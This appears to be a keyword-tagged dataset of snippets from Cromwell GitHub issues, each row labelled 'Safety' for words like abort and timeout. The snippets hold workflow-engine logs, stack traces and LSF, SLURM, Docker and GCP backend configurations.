Safety,"cher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3211,Abort,Abort,3211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"cher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2888,Abort,Abort,2888,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"ciated jobs are still present in JOB_STORE_ENTRY. . There are no errors in the logs: ; `; 2016-12-12 18:22:26,139 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(8a965a5e)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:29:42,727 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(73be7f27)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:31:29,146 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: A",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1432,Abort,Abort,1432,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"cificity_oncotate_oncotated_target_seg_gt_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_oncotate/SM-74ND9.per_target.oncotated.txt"",; ""crsp_validation_workflow_specificity_run_sensitivity_precision_small_sens_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_run_sensitivity_precision/SM-74ND9.sens_prec.small_segs.tsv"",; ""crsp_validation_workflow_specificity_run_sensitivity_precision_del_sens_prec_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_run_sensitivity_precision/SM-74ND9.sens_prec.del.tsv""; },; ""id"": ""020aa0e3-d12f-4085-b8a7-1de06c8df598""; }; [INFO] [12/08/2016 21:02:52.660] [cromwell-system-akka.actor.default-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor] SingleWorkflowRunnerActor writing metadata to /home/lichtens/test_eval/crsp_validation_input_files/crsp_validation_from_cromwell.json.metadata.json; [INFO] [12/08/2016 21:02:52.719] [shutdownHook1] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor: Received shutdown signal.; [INFO] [12/08/2016 21:02:52.720] [cromwell-system-akka.actor.default-dispatcher-34] [akka://cromwell-system/deadLetters] Message [cromwell.engine.workflow.WorkflowManagerActor$AbortAllWorkflowsCommand$] from Actor[akka://cromwell-system/deadLetters] to Actor[akka://cromwell-system/deadLetters] was not delivered. [2] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; Capturing latest dir...; 7d822ec4-ca21-4e05-94ad-9d16acd5e534; lichtens@lichtens-big:~/test_eval$; ```. Do you see it? Look at that last line! It's a prompt! Cromwell exited successfully!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-266019352:3315,Abort,AbortAllWorkflowsCommand,3315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-266019352,1,['Abort'],['AbortAllWorkflowsCommand']
Safety,"ckgroundConfigAsyncJobExecutionActor [132d7527test.t1:NA:1]: job id: 9836; [2017-12-01 20:01:04,92] [info] BackgroundConfigAsyncJobExecutionActor [132d7527test.t1:NA:1]: Status change from - to WaitingForReturnCodeFile; [2017-12-01 20:01:06,50] [info] BackgroundConfigAsyncJobExecutionActor [132d7527test.t1:NA:1]: Status change from WaitingForReturnCodeFile to Done; [2017-12-01 20:01:06,61] [error] WorkflowManagerActor Workflow 132d7527-a0af-4f08-8291-d935e7cd5632 failed (during ExecutingWorkflowState): Could not evaluate t1.out = if select_first([flag1,false]) then glob(""test1.txt"")[0] else glob(""test2.txt"")[0]; java.lang.RuntimeException: Could not evaluate t1.out = if select_first([flag1,false]) then glob(""test1.txt"")[0] else glob(""test2.txt"")[0]; at wdl4s.wdl.WdlTask$$anonfun$4.applyOrElse(WdlTask.scala:189); at wdl4s.wdl.WdlTask$$anonfun$4.applyOrElse(WdlTask.scala:188); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); at scala.util.Failure.recoverWith(Try.scala:232); at wdl4s.wdl.WdlTask.$anonfun$evaluateOutputs$2(WdlTask.scala:188); at scala.collection.TraversableOnce.$anonfun$foldLeft$1(TraversableOnce.scala:157); at scala.collection.TraversableOnce.$anonfun$foldLeft$1$adapted(TraversableOnce.scala:157); at scala.collection.Iterator.foreach(Iterator.scala:929); at scala.collection.Iterator.foreach$(Iterator.scala:929); at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); at scala.collection.IterableLike.foreach(IterableLike.scala:71); at scala.collection.IterableLike.foreach$(IterableLike.scala:70); at scala.collection.AbstractIterable.foreach(Iterable.scala:54); at scala.collection.TraversableOnce.foldLeft(TraversableOnce.scala:157); at scala.collection.TraversableOnce.foldLeft$(TraversableOnce.scala:155); at scala.collection.AbstractTraversable.foldLeft(Traversable.scala:104); at wdl4s.wdl.WdlTask.evaluateOutputs(WdlTask.scala:181); at cromwell.backend.wdl.OutputEvaluator$.evaluateOutputs(OutputEvaluator.scala:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2972:3831,recover,recoverWith,3831,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2972,1,['recover'],['recoverWith']
Safety,"com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf) to solve the problem, but maybe it is better to have a `post-docker` configuration which is added to the pipeline similar to the `script-epilogue`. This would make easier the configuration of docker runs, separating submission and checks. By now, I will use the following local configuration to continue my work with the cromwell runner:. ```; include required(classpath(""application"")). ## keep always the workflow logs; workflow-options.workflow-log-temporary: false. backend.providers.Local.config {; ## limit the number of jobs; concurrent-job-limit = 15; # set the root directory to the run; filesystems.local {; ## do not allow copy (huge files); localization: [""hard-link"", ""soft-link""]; caching.duplication-strategy: [""hard-link"", ""soft-link""]; }; # custom submit-docker to workaround detached container due to timeout in the virtual machine; # first, we do not remove the container until it really finishes (no --rm flag); # if the docker run command fails, then it runs docker wait to wait until it finishes and store the return code; # if the docker run command fails, then it runs docker wait to return the real exit code even if detached; # once it finishes, removes the docker container with docker rm; # finally, returns the ""real return code"" stored; submit-docker = """"""; docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; rc=$(docker wait `cat ${docker_cid}`); docker rm `cat ${docker_cid}`; exit $rc; """"""; }; ```. By the way, it looks like the configuration of the local backend in the docs is still under development (http://cromwell.readthedocs.io/en/develop/tutorials/LocalBackendIntro/). I think that this kind of things can be part of the docs if not included as default in the source code - let me know if I can do something to help documenting the local end, which I am using as my default one.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526:1621,timeout,timeout,1621,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526,1,['timeout'],['timeout']
Safety,"com/cloudsdktool/cloud-sdk:276.0.0-slim""; pullStopped:; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; timestamp: '2021-08-03T15:23:12.246251722Z'; - description: Started pulling ""gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim""; pullStarted:; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; timestamp: '2021-08-03T15:22:42.922496298Z'; - description: Worker ""google-pipelines-worker-xxxxxx""; assigned in ""us-central1-b"" on a ""custom-1-2048"" machine; timestamp: '2021-08-03T15:22:07.789742627Z'; workerAssigned:; instance: google-pipelines-worker-xxxxxx; machineType: custom-1-2048; zone: us-central1-b; labels:; cromwell-workflow-id: cromwell-xxxxxx; wdl-task-name: hello; pipeline:; actions:; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Starting\ container\ setup.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: ContainerSetup; timeout: 300s; - commands:; - -c; - mkdir -p /cromwell_root && chmod -R a+rwx /cromwell_root; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: ContainerSetup; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Done\ container\ setup.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: ContainerSetup; timeout: 300s; - commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Background; runInBackground: true; - commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; outputName: stder",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:15897,timeout,timeout,15897,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['timeout'],['timeout']
Safety,"cond; 	}; input-read-limits {; lines = 128000000; bool = 7; int = 19; float = 50; string = 1280000; json = 12800000; tsv = 1280000000; map = 128000000; object = 128000000; }. # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; 	graceful-server-shutdown = true; max-concurrent-workflows = 5000. io {; throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; number-of-requests = 100000; per = 100 seconds; }; }; }. akka {; # Optionally set / override any akka settings; http {; server {; # Increasing these timeouts allow rest api responses for very large jobs; # to be returned to the user. When the timeout is reached the server would respond; # `The server was not able to produce a timely response to your request.`; # https://gatkforums.broadinstitute.org/wdl/discussion/10209/retrieving-metadata-for-large-workflows; request-timeout = 600s; idle-timeout = 600s; }; }; }. services {; MetadataService {; #class = ""cromwell.services.metadata.impl.MetadataServiceActor""; config {; metadata-read-row-number-safety-threshold = 2000000; # # For normal usage the default value of 200 should be fine but for larger/production environments we recommend a; # # value of at least 500. There'll be no one size fits all number here so we recommend benchmarking performance and; # # tuning the value to match your environment.; db-batch-size = 700; }; }; }. google {. application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. docker {; hash-lookup {; method = ""remote""; }; }. engine {; filesystems {; gcs {; auth = ""application-default""; }; }; }. call-caching {; enabled = true; }. backend {; default = GCP",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:8631,timeout,timeout,8631,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['timeout'],['timeout']
Safety,"configuration file used is as follows (edited to remove the main script):; ```; include required(classpath(""application"")); backend {; default = LSF; providers {; LSF {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; exit-code-timeout-seconds = 300; runtime-attributes = """"""; Int cpu; Int memory_mb; String? lsf_queue; String? lsf_project; String? docker; """""". submit = """"""; bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpu} \; -R 'rusage[mem=${memory_mb}] span[hosts=1]' \; -M ${memory_mb} \; /usr/bin/env bash ${script}; """""". submit-docker = """"""; module load tools/singularity/3.8.3; SINGULARITY_MOUNTS='<redacted>'; export SINGULARITY_CACHEDIR=$HOME/.singularity/cache; LOCK_FILE=$SINGULARITY_CACHEDIR/singularity_pull_flock. export SINGULARITY_DOCKER_USERNAME=<redacted>; export SINGULARITY_DOCKER_PASSWORD=<redacted>. flock --exclusive --timeout 900 $LOCK_FILE \; singularity exec docker://${docker} \; echo ""Sucessfully pulled ${docker}"". bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpu} \; -R 'rusage[mem=${memory_mb}] span[hosts=1]' \; -M ${memory_mb} \; singularity exec --containall $SINGULARITY_MOUNTS --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}; """""". job-id-regex = ""Job <(\\d+)>.*""; kill = ""bkill ${job_id}""; kill-docker = ""bkill ${job_id}""; check-alive = ""bjobs -w ${job_id} |& egrep -qvw 'not found|EXIT|JOBID'"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [; ""soft-link"", ""copy"", ""hard-link""; ]; hashing-strategy: ""path+modtime""; }; }; }; }; }; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=fa",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7203:1663,timeout,timeout,1663,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7203,1,['timeout'],['timeout']
Safety,core.internal.http.pipeline.stages.HandleResponseStage.handleErrorResponse(HandleResponseStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:44); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:51); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execut,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:1379,Timeout,TimeoutExceptionHandlingStage,1379,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['Timeout'],['TimeoutExceptionHandlingStage']
Safety,cromwell server start error with MySQL: Error searching for abort requests,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5084:60,abort,abort,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5084,1,['abort'],['abort']
Safety,"ctDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:46,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:47,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:48,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:49,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:50,94] [info] Waiting for 1 workflows to abort...; ^C[2016-10-27 13:10:51,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:52,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:53,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:54,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:55,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:56,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:57,16] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleCl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:16931,abort,abort,16931,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"ctor.scala:103); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$receive$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:66); at akka.actor.Actor$class.aroundReceive(Actor.scala:467); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:59); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:516); at akka.actor.ActorCell.invoke(ActorCell.scala:487); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:238); at akka.dispatch.Mailbox.run(Mailbox.scala:220); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```. To a novice user it is not clear whether that this can safely be ignored. This is a problem in particular if this first use actually fails for some other reason. The user will spend time trying to figure out if the problem is caused by a credential issue. I tried to see if I could easily suppress this by setting up ""backends"" to only include ""local"". I pulled down the [application.conf](https://github.com/broadinstitute/cromwell/blob/9f759a54a0b8873f1338f36391f985477d83475a/engine/src/main/resources/application.conf) which sets:. ```; backend {; // Either ""jes"", ""local"", or ""sge"" (case insensitive); defaultBackend = ""local""; // List of backends which this Cromwell supports. Be sure to include the defaultBackend!; backendsAllowed = [ ""local"" ]; ```. and then passed the file as:. `$ java -Dconfig.file=application.conf -jar cromwell.jar run hello.wdl hello.json; `; But the exception and warning were still raised. Should the ADC check be occurring even when backendsAllowed does not include JES?. Thanks.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/705:5161,safe,safely,5161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/705,1,['safe'],['safely']
Safety,"ctorFactory""; config {; runtime-attributes = """"""; String userid; String partitions; String memory_per_node; Int nodes; Int cores; String time; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - When a job has not been alive for longer than this timeout; # - And has still not produced an RC file; # - Then it will be marked as Failed.; # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). exit-code-timeout-seconds = 600. submit = """"""; chmod 770 -R ${cwd}; sudo change-files.sh ${userid} ${cwd}; phoenix_home_cwd=""/home/${userid}""; phoenix_home_out=""/home/${userid}/stdout""; phoenix_home_err=""/home/${userid}/stderr"". phoenix_script=${script}_phonix; cat ${script} | sed -s ""s@#\!/bin/bash@#\!/bin/bash\nsource '/etc/profile' @g"" > $phoenix_script. sbatch --uid=${userid} --gid=${userid} \; -J ${job_name} \; -p ${partitions} \; -N ${nodes} \; -n ${cores} \; --mem=${memory_per_node} \; --time=${time} \; -D $phoenix_home_cwd \; -o $phoenix_home_out \; -e $phoenix_home_err \; $phoenix_script; """""". kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*"". root = ""/fast/gdr/uat/cromwell-executions""; }; }. } # providers. } # backend. # https://gatkforums.broadinstitute.org/wdl/discussion/9536/how-do-i-set-up-a-mysql-database-for-cromwell; # http://slick.lightbend.com/doc/3.2.0/api/index.html#slick.jdbc.JdbcBackend$DatabaseFactoryDef@forConfig(String,Config,Driver):Database. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://gdr-cromwell-uat-URL/uat_gdr_cromwell?rewriteBatchedStatements=true""; user = ""uat_gdr_cromwell""; password = ""<<cromwell_mysql_password>>""; connectionTimeout = 15000; }; }. system {; abort-jobs-on-terminate = false; max-concurrent-workflows = 1000; new-workflow-poll-rate = 2; max-workflow-launch-count = 50; }. # helpful links; # https://devhub.io/repos/broadinstitute-cromwell",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4404:3326,abort,abort-jobs-on-terminate,3326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4404,1,['abort'],['abort-jobs-on-terminate']
